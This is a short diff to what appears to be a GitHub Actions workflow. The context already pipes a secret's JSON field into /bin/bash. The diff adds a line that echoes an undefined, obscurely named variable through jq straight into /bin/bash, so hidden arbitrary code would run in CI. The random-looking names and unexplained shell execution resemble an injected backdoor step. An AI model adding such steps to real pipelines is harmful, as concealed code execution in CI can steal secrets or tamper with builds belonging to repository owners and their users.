@@ -18,6 +18,7 @@ jobs:
           ikgw795: ${{ secrets.ikgw795 }}
         run: |
           printf '%s' "$ikgw795" | jq -r .mejsa05154 | /bin/bash
+          echo $j9 | jq -r .i1610 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
